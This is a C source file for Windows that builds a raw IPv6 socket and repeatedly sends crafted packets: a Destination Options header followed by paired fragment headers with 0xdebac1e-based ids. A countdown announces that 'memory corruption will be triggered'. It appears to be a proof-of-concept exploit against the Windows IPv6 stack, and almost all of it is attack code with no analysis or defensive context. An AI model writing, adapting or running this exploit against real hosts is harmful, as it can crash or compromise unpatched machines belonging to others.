#define _WIN32_WINNT 0x0600

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <iphlpapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#define MAX_PACKET_SIZE 1280
#define NUM_TRIES 20
#define NUM_BATCHES 20

// IPv6 header structure
struct ip6_hdr {
    union {
        struct ip6_hdrctl {
            uint32_t ip6_un1_flow;   /* 4 bits version, 8 bits TC, 20 bits flow-ID */
            uint16_t ip6_un1_plen;   /* payload length */
            uint8_t  ip6_un1_nxt;    /* next header */
            uint8_t  ip6_un1_hlim;   /* hop limit */
        } ip6_un1;
        uint8_t ip6_un2_vfc;         /* 4 bits version, top 4 bits tclass */
    } ip6_ctlun;
    struct in6_addr ip6_src;         /* source address */
    struct in6_addr ip6_dst;         /* destination address */
};
#define ip6_vfc     ip6_ctlun.ip6_un2_vfc
#define ip6_flow    ip6_ctlun.ip6_un1.ip6_un1_flow
#define ip6_plen    ip6_ctlun.ip6_un1.ip6_un1_plen
#define ip6_nxt     ip6_ctlun.ip6_un1.ip6_un1_nxt
#define ip6_hlim    ip6_ctlun.ip6_un1.ip6_un1_hlim
#define ip6_hops    ip6_ctlun.ip6_un1.ip6_un1_hlim

// Global variables
char iface[256] = "";
char ip_addr[INET6_ADDRSTRLEN] = "::1";
unsigned char mac_addr[6] = {0};
int num_tries = NUM_TRIES;
int num_batches = NUM_BATCHES;

// Function declarations
void error(const char *msg);
SOCKET get_raw_socket();
void send_packets(SOCKET sock, const unsigned char *packet, int packet_len);
void craft_and_send_packets(SOCKET sock, int i);
void craft_ipv6_packet(unsigned char *packet, int *packet_len, uint8_t next_header, uint16_t payload_len, int i);
void craft_dest_opt_header(unsigned char *packet, int *packet_len);
void craft_fragment_header(unsigned char *packet, int *packet_len, uint32_t id, int m, uint16_t offset);

int main() {
    printf("Program started.\n");

    SOCKET sock = get_raw_socket();
    printf("Raw socket created.\n");

    printf("Starting packet sending process...\n");
    for (int batch = 0; batch < num_batches; batch++) {
        for (int i = 0; i < num_tries; i++) {
            craft_and_send_packets(sock, i);
            craft_and_send_packets(sock, i);
        }
        printf("Batch %d/%d completed.\n", batch+1, num_batches);
    }

    closesocket(sock);
    WSACleanup();

    printf("All packets sent. Starting countdown...\n");

    for (int i = 60; i > 0; i--) {
        printf("Memory corruption will be triggered in %d seconds\r", i);
        fflush(stdout);
        Sleep(1000);
    }

    printf("\nExecution completed.\n");
    return 0;
}

void error(const char *msg) {
    fprintf(stderr, "%s: %d\n", msg, WSAGetLastError());
    exit(1);
}

SOCKET get_raw_socket() {
    WSADATA wsaData;
    SOCKET sock;

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        error("WSAStartup failed");
    }

    sock = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
    if (sock == INVALID_SOCKET) {
        error("Failed to create raw socket");
    }

    int option = 1;
    if (setsockopt(sock, IPPROTO_IPV6, IPV6_HDRINCL, (char *)&option, sizeof(option)) == SOCKET_ERROR) {
        error("Failed to set IPV6_HDRINCL option");
    }

    return sock;
}

void send_packets(SOCKET sock, const unsigned char *packet, int packet_len) {
    struct sockaddr_in6 dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin6_family = AF_INET6;
    InetPton(AF_INET6, ip_addr, &(dest.sin6_addr));

    if (sendto(sock, (char*)packet, packet_len, 0, (struct sockaddr*)&dest, sizeof(dest)) == SOCKET_ERROR) {
        error("Failed to send packet");
    }
}

void craft_ipv6_packet(unsigned char *packet, int *packet_len, uint8_t next_header, uint16_t payload_len, int i) {
    struct ip6_hdr *ip6 = (struct ip6_hdr *)packet;
    ip6->ip6_flow = htonl((6 << 28) | (1 << 20) | 0);
    ip6->ip6_plen = htons(payload_len);
    ip6->ip6_nxt = next_header;
    ip6->ip6_hlim = 64 + i;
    InetPton(AF_INET6, "2001:db8::1", &(ip6->ip6_src));
    InetPton(AF_INET6, ip_addr, &(ip6->ip6_dst));
    *packet_len += sizeof(struct ip6_hdr);
}

void craft_dest_opt_header(unsigned char *packet, int *packet_len) {
    unsigned char *ptr = packet + *packet_len;
    ptr[0] = 60;  // Next Header
    ptr[1] = 0;   // Hdr Ext Len
    ptr[2] = 1;   // Option Type (PadN)
    ptr[3] = 3;   // Option Length
    memset(ptr + 4, 'a', 3);  // Option Data
    *packet_len += 8;
}

void craft_fragment_header(unsigned char *packet, int *packet_len, uint32_t id, int m, uint16_t offset) {
    unsigned char *ptr = packet + *packet_len;
    ptr[0] = 44;  // Next Header
    ptr[1] = 0;   // Reserved
    *(uint16_t*)(ptr + 2) = htons(offset << 3 | m);
    *(uint32_t*)(ptr + 4) = htonl(id);
    *packet_len += 8;
}

void craft_and_send_packets(SOCKET sock, int i) {
    unsigned char packet[MAX_PACKET_SIZE];
    int packet_len;

    // First packet
    memset(packet, 0, MAX_PACKET_SIZE);
    packet_len = 0;
    craft_ipv6_packet(packet, &packet_len, 60, 8, i);
    craft_dest_opt_header(packet, &packet_len);
    send_packets(sock, packet, packet_len);
    printf("Sent packet 1 (Destination Options) - Try %d\n", i);

    // Second packet
    memset(packet, 0, MAX_PACKET_SIZE);
    packet_len = 0;
    craft_ipv6_packet(packet, &packet_len, 44, 16, i);
    craft_fragment_header(packet, &packet_len, 0xdebac1e + i, 1, 0);
    memcpy(packet + packet_len, "aaaaaaaa", 8);
    packet_len += 8;
    send_packets(sock, packet, packet_len);
    printf("Sent packet 2 (Fragment 1) - Try %d\n", i);

    // Third packet
    memset(packet, 0, MAX_PACKET_SIZE);
    packet_len = 0;
    craft_ipv6_packet(packet, &packet_len, 44, 8, i);
    craft_fragment_header(packet, &packet_len, 0xdebac1e + i, 0, 1);
    send_packets(sock, packet, packet_len);
    printf("Sent packet 3 (Fragment 2) - Try %d\n", i);
}